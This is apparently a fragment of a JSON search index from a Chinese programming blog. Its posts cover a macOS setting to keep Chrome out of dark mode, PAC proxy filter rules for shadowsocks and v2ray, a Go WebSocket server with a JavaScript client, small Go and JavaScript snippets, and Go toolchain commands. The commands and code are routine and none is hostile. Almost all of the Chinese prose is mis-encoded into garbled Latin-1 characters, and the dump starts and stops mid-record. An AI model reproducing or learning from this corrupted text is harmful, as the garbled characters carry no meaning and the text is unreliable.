1.ç¦ç”¨Chromeçš„é»‘è‰²æ¨¡å¼/ Dark Mode Chrome 73+åœ¨åº”ç”¨ä¸­æ”¯æŒäº†ã€ŒMacOS Mojaveç³»ç»Ÿå±‚é¢çš„é»‘è‰²æ¨¡å¼ã€ï¼Œå³ç³»ç»Ÿè®¾ç½®ä¸ºé»‘è‰²æ¨¡å¼æ—¶ï¼ŒChromeä¼šè‡ªåŠ¨é€‚åº”åˆ‡æ¢åˆ°Dark Mode\næ·±è‰²æ¨¡å¼ç¡®å®å¾ˆèˆ’æœï¼Œä½†åœ¨ä¸€äº›Webç½‘é¡µä¸­ï¼Œæµç¨‹å›¾ä¹‹ç±»çš„å›¾è¡¨ä¹Ÿæ˜¯ç”¨é»‘è‰²è¡¨ç¤ºï¼Œåœ¨Dark Modeæ¨¡å¼ä¸‹å°±ä¼šå‡ºç°çœ‹ä¸æ¸…æ¥šçš„æƒ…å†µã€‚æ‰€ä»¥ï¼Œéœ€æ±‚â€œç³»ç»Ÿä½¿ç”¨Dark Modeçš„æƒ…å†µä¸‹å°†Chromeçš„é»‘è‰²ç¦ç”¨â€:\n# é€šè¿‡å‘½ä»¤è¡Œä¸­è®¾ç½® defaults å€¼ defaults write com.google.Chrome NSRequiresAquaSystemAppearance -bool Yes # å¦‚æœæƒ³æ¢å¤é»˜è®¤ï¼Œåªéœ€è¦å°†åˆšæ‰è®¾ç½®çš„å€¼åˆ æ‰æˆ–è€…å°† Yes è®¾ç½®æˆ No $ defaults delete com.google.Chrome NSRequiresAquaSystemAppearance å‚è€ƒ: ç¦ç”¨Chromeçš„é»‘è‰²æ¨¡å¼/ Dark Mode\nä½†åˆå‡ºç°äº†ä¸€ä¸ªæ–°é—®é¢˜: Chromeçš„é¦–é¡µæœç´¢æ¡†ï¼Œåº”è¯¥æ˜¯è¢«ã€Œdefaultsè®¾ç½®ã€è¦†ç›–äº†ï¼Œæ˜¾ç¤ºä¸å‡ºæ¥äº†ï¼Œè§£å†³åŠæ³•æ˜¯ï¼š æŒ‰ç…§ä¸Šé¢æ¢å¤NSRequiresAquaSystemAppearanceè®¾ç½®ã€‚ä½†ã€Œå±é™©ã€æ“ä½œã€‚æœ‰çš„å°ä¼™ä¼´ï¼Œæ¢å¤äº†ä¹Ÿæ²¡æœ‰ç«‹å³ç”Ÿæ•ˆï¼ŒChromeçš„é¦–é¡µæœç´¢æ è¿˜æ˜¯çœ‹ä¸åˆ°ã€‚ æ¨èç¬¬2ç§ï¼ˆè®¾ç½®Chromeè‡ªèº«çš„é¢œè‰²ä¸»é¢˜ï¼‰ï¼Œæ–¹å¼å¦‚ä¸‹: æ³¨: è¿™ç§æ–¹å¼å¯¹å¤§å¤šæ•°ç½‘é¡µæ˜¯æœ‰ç”¨çš„ï¼Œä½†æœ‰ä¸€äº›åŸºäºGitBookså¼€å‘çš„æˆ–å¼€å‘è€…è‡ªå·±è®¾ç½®äº†è·Ÿéšç³»ç»Ÿä¸»é¢˜çš„ï¼Œæœ€ç»ˆè¿˜æ˜¯æ— æ³•æ›´æ”¹ã€‚æ¯”å¦‚: http://www.webgl3d.cn/pages/c0b143/\nå¯¹æµ…è‰²ä¸»é¢˜æœ‰å¼ºéœ€æ±‚çš„è¯ï¼Œæƒ³è¦å½»åº•ä¿®æ”¹ï¼Œç›®å‰æ¥çœ‹åªèƒ½ä¿®æ”¹ã€Œç³»ç»Ÿçš„ä¸»é¢˜é¢œè‰²ã€ã€‚\näºŒã€é—®é¢˜ å¾…è¡¥å……\u0026hellip;\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/36.chrome-setting/","summary":"\u003cp\u003eè®°å½•ä¸€äº›\u003ccode\u003eChrome\u003c/code\u003eæµè§ˆå™¨çš„é…ç½®å’Œé—®é¢˜\u0026hellip;\u003c/p\u003e","title":"æµè§ˆå™¨: Chromeçš„é…ç½®å’Œé—®é¢˜"},{"content":"SSRå·¥å…·PACæ¨¡å¼ Adblock Plus Filtersè‡ªå®šä¹‰è§„åˆ™\u0026hellip;\nç›¸å…³æ–‡ç« ï¼š\nLinux: Deepinç³»ç»Ÿç¯å¢ƒé…ç½® / ç§‘å­¦ä¸Šç½‘ ä¸€ã€Adblock Plus Filtersè‡ªå®šä¹‰è§„åˆ™ 1. å¸¸ç”¨SSRå·¥å…· shadowsocks v2ray 2. è‡ªå®šä¹‰è§„åˆ™ å¸¸ç”¨è§„åˆ™:\n# 1.é€šé…ç¬¦ * â€” èµ°ä»£ç† # è¡¨ç¤ºä»»ä½•å­—ç¬¦ä¸²ï¼Œä»»ä½•æ»¡è¶³æ¡ä»¶çš„éƒ½èµ°ä»£ç†ã€‚å¦‚: *.example.com/* åŒ¹é…: https://www.example.com https://image.example.com https://image.example.com/abcd # 2.ä¾‹å¤–è§„åˆ™ @@ â€” ä¸èµ°ä»£ç† # ä»»ä½•æ»¡è¶³@@åé¢è§„åˆ™çš„åœ°å€ï¼Œéƒ½ä¸èµ°ä»£ç†ã€‚å¦‚: @@*.example.com/\\* åŒ¹é…: https://www.example.com https://image.example.com https://image.example.com/abcd # 3. || æ ‡è®° # åªåŒ¹é…åŸŸåçš„ç»“å°¾ â€”â€” èµ°ä»£ç† ||example.com # 4. | æ ‡è®° # åŒ¹é…åœ°å€çš„å¼€å¤´å’Œç»“å°¾ â€”â€” èµ°ä»£ç† |https://example.com # ä»¥https://example.comå¼€å¤´çš„åœ°å€ example.com| # ä»¥example.comç»“å°¾çš„åœ°å€ # 5. ! æ ‡è®° # !åé¢çš„å†…å®¹è¡¨ç¤ºæ³¨é‡Šï¼Œä»¥!å¼€å¤´çš„è§„åˆ™ä¹Ÿä¼šæ— æ•ˆ GFW Listå†…å¸¸ç”¨åŸŸååŒ¹é…ç™½åå•ï¼š\n# å¯ç‚¹å‡»SSRè½¯ä»¶çš„PACé…ç½®ï¼Œä»GFW Liståå•æŸ¥çœ‹æ›´å¤šï¼š # åœ°å€ä¸º: http://127.0.0.1:11085/pac/proxy.js # èµ°ä»£ç† ||github.com ||github.io ||jsdelivr.net .google.com ... # ä¸èµ°ä»£ç† @@||aliyun.com @@||baidu.com @@||chinaso.com @@||chinaz.com @@||qq.com @@||sina.cn ... 3. æ·»åŠ ã€Œç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™ã€åˆ°SSR PACæ¨¡å¼ä¸‹ï¼Œv2rayç­‰ä¼šè‡ªåŠ¨é€‰æ‹©GFW Listé‡Œçš„ç½‘å€ä½¿ç”¨ä»£ç†ã€‚ä½†å› ä¸ºåœ¨ã€Œå¢™å†…ã€ï¼Œä½ å¸Œæœ›èµ°ä»£ç†è®¿é—®çš„ç½‘å€ï¼Œå¯èƒ½ä¸è¢«åŒ…å«åœ¨é»˜è®¤PACåˆ—è¡¨é‡Œã€‚æ‰€ä»¥ï¼Œéœ€è¦æˆ‘ä»¬æ·»åŠ ã€Œç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™ã€æ¥å®ç°è®¿é—®ç‰¹å®šç½‘ç«™æ—¶èµ°ä»£ç†ã€‚\n(1) ç¤ºä¾‹è§„åˆ™Demo\n!èµ°æ­ç†çš„æ‰€æœ‰åŸŸååœ°å€ ||google.* ||npmjs.com ||mozilla.* ||poe.com ||openai.com !ä¸èµ°ä»£ç†çš„æ‰€æœ‰åŸŸååœ°å€ @@||gitee.com @@||csdn.net @@||juejin.cn @@||leetcode.cn @@||webgl3d.cn !åœ¨èŒå…¬å¸çš„åŸŸååœ°å€ @@.baidu.com (2) æ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™\næ‰“å¼€SSRè½¯ä»¶ï¼ˆv2rayã€shadowsocksç­‰ï¼‰çš„PACè®¾ç½®ï¼Œæ·»åŠ ä¸Šé¢(1)ä¸­çš„ç”¨æˆ·è‡ªå®šä¹‰demoè§„åˆ™ã€‚\nå‚è€ƒ Shadowsocks PACæ¨¡å¼è‡ªå®šä¹‰è§„åˆ™ ShadowSocks è‡ªå®šä¹‰è§„åˆ™ Adblock Plus filterså®˜æ–¹ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/vpn-ssr-adblock-filters/","summary":"\u003cp\u003eSSRå·¥å…·PACæ¨¡å¼ Adblock Plus Filtersè‡ªå®šä¹‰è§„åˆ™\u0026hellip;\u003c/p\u003e","title":"VPN: Adblock Plus Filtersè‡ªå®šä¹‰è§„åˆ™"},{"content":"ç ”ç©¶å¦‚ä½•åœ¨åŸºäºGoçš„ç¨‹åºä¸­ä½¿ç”¨WebSocketæ¥åšä¸€äº›ã€å®æ—¶ã€‘çš„äº‹æƒ…\u0026hellip;\nä¸€ã€ä»€ä¹ˆæ˜¯WebSocket å€¼å¾—ä¸€æçš„æ˜¯:\nä¸ºä»€ä¹ˆä½¿ç”¨WebSocket? å®ƒä»¬ä¸ä¼ ç»ŸHTTPè¯·æ±‚æœ‰ä½•ä¸åŒ? WebSocketsæ˜¯å‡çº§åçš„HTTPã€è¿æ¥ã€‘ï¼Œåœ¨è¿æ¥è¢«å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç»ˆæ­¢ä¹‹å‰ä¸€ç›´å­˜åœ¨ã€‚åŸºäºæ­¤ï¼Œå¯ä»¥æ‰§è¡ŒåŒå·¥é€šä¿¡ï¼Œä»è€Œä½¿ç”¨è¿™ä¸ªå•ä¸€è¿æ¥ä»æˆ‘ä»¬çš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚\nWebSockets çš„çœŸæ­£ç¾å¦™ä¹‹å¤„åœ¨äºå®ƒä»¬æ€»å…±ä½¿ç”¨äº† 1 ä¸ª TCP è¿æ¥ï¼Œå¹¶ä¸”æ‰€æœ‰é€šä¿¡éƒ½æ˜¯é€šè¿‡è¿™ä¸ªå•ä¸€çš„é•¿å¯¿å‘½ TCP è¿æ¥å®Œæˆçš„ã€‚è¿™å¤§å¤§å‡å°‘äº†ä½¿ç”¨ WebSockets æ„å»ºå®æ—¶åº”ç”¨ç¨‹åºæ‰€éœ€çš„ç½‘ç»œå¼€é”€ï¼Œå› ä¸ºä¸éœ€è¦å¯¹ HTTP ç«¯ç‚¹è¿›è¡ŒæŒç»­è½®è¯¢ã€‚\näºŒã€æ­å»ºWebsocketæœåŠ¡ 1.ä½¿ç”¨Goæ­å»º $ go get github.com/gorilla/websocket æºç å‚è€ƒï¼šgo-gin-web æµç¨‹å‚è€ƒGolang ä½¿ç”¨ Websocket æ•™ç¨‹ ä¸‰ã€æµ‹è¯•WebsocketæœåŠ¡ 1.Websocketåœ¨çº¿æ¨¡æ‹Ÿè¯·æ±‚å·¥å…· å¦‚ï¼šwebsocketé€šä¿¡åœ°å€\næ³¨æ„ï¼šé»˜è®¤Getè¯·æ±‚ã€‚è‹¥è¦å‘é€jsonæ ¼å¼æ•°æ®ï¼Œåˆ™æµ‹è¯•æ¶ˆæ¯æ ¼å¼å‚è€ƒï¼š\n{\u0026#34;ownerId\u0026#34;:1, \u0026#34;targetId\u0026#34;:6, \u0026#34;msgType\u0026#34;:1, \u0026#34;media\u0026#34;:1, \u0026#34;Content\u0026#34;:\u0026#34;hello, lianfei1\u0026#34;} 2.å‰ç«¯demoæµ‹è¯• function initWebsocket () { var url = \u0026#34;ws://\u0026#34; + location.host + \u0026#34;/chat?userId=\u0026#34; + userId() + \u0026#34;\u0026amp;token=\u0026#34; + util.parseQuery(\u0026#34;token\u0026#34;); this.webSocket = new WebSocket(url); //æ¶ˆæ¯å¤„ç† this.webSocket.onmessage = function (evt) { console.log(\u0026#34;onmessage\u0026#34;, evt.data) if (evt.data.indexOf(\u0026#34;}\u0026#34;) \u0026gt; -1) { console.log(\u0026#34;recv json \u0026lt;==\u0026#34; + evt.data) this.onmessage(JSON.parse(evt.data)); } else { console.log(\u0026#34;recv\u0026lt;==\u0026#34; + evt.data) } }.bind(this) //å…³é—­å›è°ƒ this.webSocket.onclose = function (evt) { console.log(\u0026#34;æ‚¨å·²è‡ªåŠ¨ä¸‹çº¿\u0026#34;) //code 1006 } //å‡ºé”™å›è°ƒ this.webSocket.onerror = function (evt) { console.log(evt.data) } /*{ this.webSocket.send() }*/ } æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-websocket/","summary":"\u003cp\u003eç ”ç©¶å¦‚ä½•åœ¨åŸºäº\u003ccode\u003eGo\u003c/code\u003eçš„ç¨‹åºä¸­ä½¿ç”¨\u003ccode\u003eWebSocket\u003c/code\u003eæ¥åšä¸€äº›ã€å®æ—¶ã€‘çš„äº‹æƒ…\u0026hellip;\u003c/p\u003e","title":"Go: Websocket"},{"content":"å¸¸ç”¨çš„ä¸€äº›code fragment\u0026hellip;\nä¸€ã€Golang 1.éšæœºæ•° import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) ... // éšæœºæ•° // 1.rand.Intn() å‡½æ•°æ˜¯ä¼ªéšæœºå‡½æ•°ï¼Œå› ä¸ºå®ƒé»˜è®¤çš„èµ„æºæ˜¯å•ä¸€å€¼ï¼Œæ‰€ä»¥æ— è®ºè¿è¡Œå¤šå°‘æ¬¡éƒ½åªä¼šè¿”å›ç›¸åŒçš„éšæœºæ•° // 2.å¦‚æœéœ€è¦æ¯æ¬¡è¿è¡Œäº§ç”Ÿä¸åŒçš„åºåˆ—ï¼Œé¡»ä½¿ç”¨Seedå‡½æ•°åˆå§‹åŒ–ï¼Œä¸”ä¼ å…¥ä¸€ä¸ªå˜åŒ–çš„å€¼ä½œä¸ºå‚æ•°ï¼Œå¦‚time.Now().Unix() rand.Seed(time.Now().Unix()) // åˆå§‹åŒ–éšæœºæ•°çš„èµ„æºåº“, å¦‚æœä¸æ‰§è¡Œè¿™è¡Œ, ä¸ç®¡è¿è¡Œå¤šå°‘æ¬¡éƒ½è¿”å›åŒæ ·çš„å€¼ accountNo := \u0026#34;prefix_str\u0026#34; + strconv.Itoa(rand.Intn(max - min) + min) // å‰ç¼€ä¸ºprefix_strçš„éšæœºå­—ç¬¦ä¸² fmt.Println(\u0026#34;Hello accountNo\u0026#34;, accountNo) // UnixNano() // å°†tè¡¨ç¤ºä¸ºUnixæ—¶é—´ï¼Œä»æ—¶é—´ç‚¹January 1, 1970 UTCåˆ°æ—¶é—´ç‚¹tæ‰€ç»è¿‡çš„æ—¶é—´ï¼ˆå•ä½çº³ç§’ï¼‰.å¦‚æœçº³ç§’ä¸ºå•ä½çš„unixæ—¶é—´è¶…å‡ºäº†int64èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œç»“æœæ˜¯æœªå®šä¹‰çš„ã€‚æ„å‘³ç€Timeé›¶å€¼è°ƒç”¨UnixNanoæ–¹æ³•çš„è¯ï¼Œç»“æœæ˜¯æœªå®šä¹‰çš„ // åœ¨windowsä¸‹ï¼Œrand.Seed(time.Now().UnixNano())ä½œä¸ºç§å­ï¼Œå¾—å‡ºçš„éšæœºæ•°å¹¶ä¸éšæœº æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-codefragment/","summary":"\u003cp\u003eå¸¸ç”¨çš„ä¸€äº›\u003ccode\u003ecode fragment\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"ä»£ç ç‰‡æ®µï¼šgo"},{"content":"å¸¸ç”¨çš„ä¸€äº›code fragment\u0026hellip;\nä¸€ã€JavaScript \u0026amp; ES6+ 1. Mapè½¬Object: const legSelectedMap = new Map(); legSelectedMap.set(\u0026#39;ä¸šåŠ¡é‡1\u0026#39;, true) legSelectedMap.set(\u0026#39;ä¸šåŠ¡é‡2\u0026#39;, false) legSelectedMap.set(\u0026#39;ä¸šåŠ¡é‡3\u0026#39;, false) console.log([...legSelectedMap.entries()]); // è¾“å‡ºï¼šArray [Array [\u0026#34;ä¸šåŠ¡é‡1\u0026#34;, true], Array [\u0026#34;ä¸šåŠ¡é‡2\u0026#34;, false], Array [\u0026#34;ä¸šåŠ¡é‡3\u0026#34;, false]] let legSelected = [...legSelectedMap.entries()].reduce((obj, [key, value]) =\u0026gt; (obj[key] = value, obj), {}) console.log(legSelected); // è¾“å‡ºï¼šObject { ä¸šåŠ¡é‡1: true, ä¸šåŠ¡é‡2: false, ä¸šåŠ¡é‡3: false } äºŒã€Golang æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-es-ts-codefragment/","summary":"\u003cp\u003eå¸¸ç”¨çš„ä¸€äº›\u003ccode\u003ecode fragment\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"ä»£ç ç‰‡æ®µï¼šjs/es6+/ts"},{"content":"å¸¸ç”¨çš„ä¸€äº›code fragment\u0026hellip;\nä¸€ã€JavaScript \u0026amp; ES6+ Mapè½¬Object:\nconst legSelectedMap = new Map(); legSelectedMap.set(\u0026#39;ä¸šåŠ¡é‡1\u0026#39;, true) legSelectedMap.set(\u0026#39;ä¸šåŠ¡é‡2\u0026#39;, false) legSelectedMap.set(\u0026#39;ä¸šåŠ¡é‡3\u0026#39;, false) console.log([...legSelectedMap.entries()]); // è¾“å‡ºï¼šArray [Array [\u0026#34;ä¸šåŠ¡é‡1\u0026#34;, true], Array [\u0026#34;ä¸šåŠ¡é‡2\u0026#34;, false], Array [\u0026#34;ä¸šåŠ¡é‡3\u0026#34;, false]] let legSelected = [...legSelectedMap.entries()].reduce((obj, [key, value]) =\u0026gt; (obj[key] = value, obj), {}) console.log(legSelected); // è¾“å‡ºï¼šObject { ä¸šåŠ¡é‡1: true, ä¸šåŠ¡é‡2: false, ä¸šåŠ¡é‡3: false } äºŒã€Golang import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) ... // éšæœºæ•° // 1.rand.Intn() å‡½æ•°æ˜¯ä¼ªéšæœºå‡½æ•°ï¼Œå› ä¸ºå®ƒé»˜è®¤çš„èµ„æºæ˜¯å•ä¸€å€¼ï¼Œæ‰€ä»¥æ— è®ºè¿è¡Œå¤šå°‘æ¬¡éƒ½åªä¼šè¿”å›ç›¸åŒçš„éšæœºæ•° // 2.å¦‚æœéœ€è¦æ¯æ¬¡è¿è¡Œäº§ç”Ÿä¸åŒçš„åºåˆ—ï¼Œé¡»ä½¿ç”¨Seedå‡½æ•°åˆå§‹åŒ–ï¼Œä¸”ä¼ å…¥ä¸€ä¸ªå˜åŒ–çš„å€¼ä½œä¸ºå‚æ•°ï¼Œå¦‚time.Now().Unix() rand.Seed(time.Now().Unix()) // åˆå§‹åŒ–éšæœºæ•°çš„èµ„æºåº“, å¦‚æœä¸æ‰§è¡Œè¿™è¡Œ, ä¸ç®¡è¿è¡Œå¤šå°‘æ¬¡éƒ½è¿”å›åŒæ ·çš„å€¼ accountNo := \u0026#34;prefix_str\u0026#34; + strconv.Itoa(rand.Intn(max - min) + min) // å‰ç¼€ä¸ºprefix_strçš„éšæœºå­—ç¬¦ä¸² fmt.Println(\u0026#34;Hello accountNo\u0026#34;, accountNo) // UnixNano() // å°†tè¡¨ç¤ºä¸ºUnixæ—¶é—´ï¼Œä»æ—¶é—´ç‚¹January 1, 1970 UTCåˆ°æ—¶é—´ç‚¹tæ‰€ç»è¿‡çš„æ—¶é—´ï¼ˆå•ä½çº³ç§’ï¼‰.å¦‚æœçº³ç§’ä¸ºå•ä½çš„unixæ—¶é—´è¶…å‡ºäº†int64èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œç»“æœæ˜¯æœªå®šä¹‰çš„ã€‚æ„å‘³ç€Timeé›¶å€¼è°ƒç”¨UnixNanoæ–¹æ³•çš„è¯ï¼Œç»“æœæ˜¯æœªå®šä¹‰çš„ // åœ¨windowsä¸‹ï¼Œrand.Seed(time.Now().UnixNano())ä½œä¸ºç§å­ï¼Œå¾—å‡ºçš„éšæœºæ•°å¹¶ä¸éšæœº æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/32.code-fragment/","summary":"\u003cp\u003eå¸¸ç”¨çš„ä¸€äº›\u003ccode\u003ecode fragment\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"ä»£ç ç‰‡æ®µï¼šjs/es6+/ts/go"},{"content":"GoåŸºç¡€å‘½ä»¤ç¤ºä¾‹\u0026hellip;\nä¸€ã€Goç‰ˆæœ¬å‡çº§ $ brew search go # ç¬¬ä¸€ç§æ–¹å¼ï¼šé‡æ–°å®‰è£… $ brew install go@1.19 # å®‰è£…æŒ‡å®šç‰ˆæœ¬ $ brew link go@1.19 --force # ç¬¬äºŒç§æ–¹å¼ï¼šå‡çº§ $ $ brew upgrade go $ go version äºŒã€é¡¹ç›®developç¯å¢ƒé…ç½® $ go version # æŸ¥çœ‹ç‰ˆæœ¬ $ go help $ go env # æŸ¥çœ‹ç¯å¢ƒå˜é‡ $ go env | grep [env_name] # ä¾‹ï¼šgo env |grep GOPROXY æŸ¥çœ‹GOPROXYé…ç½® $ go env -w GOPROXY=https://goproxy.cn,direct # è®¾ç½®å›½æœ€å†…çš„Goæ¨¡å—ä»£ç† $ go env -w GO111MODULE=on # on/off/auto $ go env -w GOPATH=/Users/lianpf/go # è®¾ç½®GOPATH è¿™é‡Œä¹Ÿå¯ä»¥ç¼–è¾‘ ~/.bash_profileå‚è€ƒï¼Œå»æ›´æ”¹ç¯å¢ƒå˜é‡ã€‚\nä¸‰ã€é¡¹ç›®moduleç®¡ç† 1.åˆå§‹åŒ– \u0026amp; è¿è¡Œ # module_nameå¯ä»¥æ˜¯è¿œç¨‹çš„ç¤ºä¾‹å¦‚example/helloï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå·±å®šä¹‰çš„package name $ go mod init [module_name] # åˆå§‹åŒ–é¡¹ç›® $ go mod tidy # ä¾èµ–go.modæ–‡ä»¶å®‰è£…ä¾èµ–ç¼ºå¤±çš„åŒ…ï¼Œç§»é™¤æ²¡ç”¨çš„åŒ… $ go get github.com/go-sql-driver/mysql # å®‰è£…ç‰¹å®špackage $ go run main.go # è¿è¡Œgoæ–‡ä»¶ $ go run . 2.ç®¡ç†åŒ…: go mod $ go mod download # ä¸‹è½½æ¨¡å—åˆ°æœ¬åœ°ç¼“å­˜ï¼Œç¼“å­˜è·¯å¾„æ˜¯ $GOPATH/pkg/mod/cache $ go mod edit # æä¾›å‘½ä»¤ç‰ˆç¼–è¾‘ go.mod çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ go mod edit -fmt go.mod ä¼šæ ¼å¼åŒ– go.mod $ go mod graph # æŠŠæ¨¡å—é—´çš„ä¾èµ–å›¾æ˜¾ç¤ºå‡ºæ¥ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-basic-commands/","summary":"\u003cp\u003e\u003ccode\u003eGo\u003c/code\u003eåŸºç¡€å‘½ä»¤ç¤ºä¾‹\u0026hellip;\u003c/p\u003e","title":"Go: Basic Commands(åŸºç¡€å‘½ä»¤)"},{"content":"go ä½¿ç”¨å¤šæ¨¡å—å·¥ä½œåŒºï¼Œè®©å¼€å‘è€…å¯åŒæ—¶å¤„ç†å¤šä¸ªæ¨¡å—çš„\u0026hellip;\nä¸€ã€ä½¿ç”¨go work go ä½¿ç”¨å¤šæ¨¡å—å·¥ä½œåŒºï¼Œè®©å¼€å‘è€…å¯åŒæ—¶å¤„ç†å¤šä¸ªæ¨¡å—çš„å¼€å‘ã€‚åœ¨Go 1.17ä¹‹å‰ï¼Œåªèƒ½ä½¿ç”¨go.mod replaceæŒ‡ä»¤å®ç°ï¼Œè™½ç„¶æ”¯æŒåŒæ—¶è¿›è¡Œå¤šä¸ªæ¨¡å—çš„å¼€å‘ï¼Œä½†ä½¿ç”¨å®ƒå¯èƒ½æ˜¯å¾ˆç—›è‹¦çš„ã€‚æ¯æ¬¡å½“ä½ æƒ³è¦æäº¤ä»£ç 